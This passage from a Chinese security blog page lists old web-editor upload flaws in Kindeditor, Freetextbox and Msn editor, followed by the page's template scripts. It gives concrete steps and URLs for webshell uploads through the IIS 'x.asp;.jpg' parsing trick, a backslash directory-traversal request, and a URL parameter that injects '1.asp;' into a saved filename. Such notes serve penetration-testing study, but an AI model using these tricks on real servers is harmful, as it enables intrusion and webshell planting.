+对上传的图片或其他文件无重命名操作，导致允许恶意用户上传<hanla></hanla>diy.asp;.jpg<hanla></hanla>来绕过对后缀名审查的限制，对于此类因编辑器作者意识犯下的错误，就算遭遇缩略图，文件头检测，也可使用图片木马 插入一句话来突破。
+
+
+Kindeditor
+利用<hanla></hanla>WIN 2003 IIS<hanla></hanla>文件名称解析漏洞获得<hanla></hanla>SHELL&nbsp;
+　　影响版本: &lt;= kindeditor 3.2.1(09<hanla></hanla>年<hanla></hanla>8<hanla></hanla>月份发布的最新版)&nbsp;
+　　脆弱描述<hanla></hanla>/<hanla></hanla>攻击利用：&nbsp;
+　　upload/2010/3/201003102334381513.jpg 大家可以前去围观。
+xx.asp;x.jpg
+
+
+Freetextbox
+　Freetextbox<hanla></hanla>遍历目录漏洞&nbsp;
+　　影响版本：未知&nbsp;
+　　脆弱描述：&nbsp;
+　　因为<hanla></hanla>ftb.imagegallery.aspx<hanla></hanla>代码中 只过滤了<hanla></hanla>/<hanla></hanla>但是没有过滤\符号所以导致出现了遍历目录的问题。&nbsp;
+　　攻击利用:&nbsp;
+　　在编辑器页面点图片会弹出一个框<hanla></hanla>(抓包得到此地址)<hanla></hanla>构造如下，可遍历目录。&nbsp;
+　　http://www.cracer.com/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&amp;rif=..&amp;cif=\..&nbsp;
+
+
+Freetextbox Asp.Net<hanla></hanla>版利用<hanla></hanla>IIS<hanla></hanla>解析漏洞获得权限
+影响版本：所有版本
+脆弱描述：
+没做登陆验证可以直接访问上传木马
+Freetextbox 3-3-1 可以直接上传任意格式的文件
+Freetextbox 1.6.3 及其他版本可以上传 格式为<hanla></hanla>x.asp;.jpg
+攻击利用：
+利用<hanla></hanla>IIS<hanla></hanla>解析漏洞拿<hanla></hanla>SHELL。上传后<hanla></hanla>SHELL<hanla></hanla>的路径为<hanla></hanla>http://cracer.com/images/x.asp;.jpg
+
+
+
+Msn editor<hanla></hanla>利用<hanla></hanla>iis6.0<hanla></hanla>解析漏洞
+
+影响版本：未知
+脆弱描述：
+点击图片上传后会出现上传页面，地址为
+http://navisec.it/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=
+用普通的图片上传后，地址为
+http://navisec.it/news/uppic/41513102009204012_1.gif
+记住这时候的路径，再点击图片的上传，这时候地址就变成了
+http://navisec.it/news/admin/uploadPic.asp?language=&amp;editImageNum=1&amp;editRemNum=41513102009204012
+很明显。图片的地址是根据<hanla></hanla>RemNum<hanla></hanla>后面的编号生成的。
+攻击利用:
+配合<hanla></hanla>IIS<hanla></hanla>的解析漏洞，把<hanla></hanla>RemNum<hanla></hanla>后面的数据修改为<hanla></hanla>1.asp;41513102009204012，变成下面这个地址
+http://navisec.it/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=1.asp;41513102009204012
+然后在浏览器里打开，然后选择你的脚本木马上传，将会返回下面的地址
+uppic/1.asp;41513102009204012_2.gif
+直接打开就是我们的小马地址！
+</code></pre>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2021 Hongxiaodou
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled"></a-icon></span>
+            @hongxiaodou
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+
+
+</body></html>
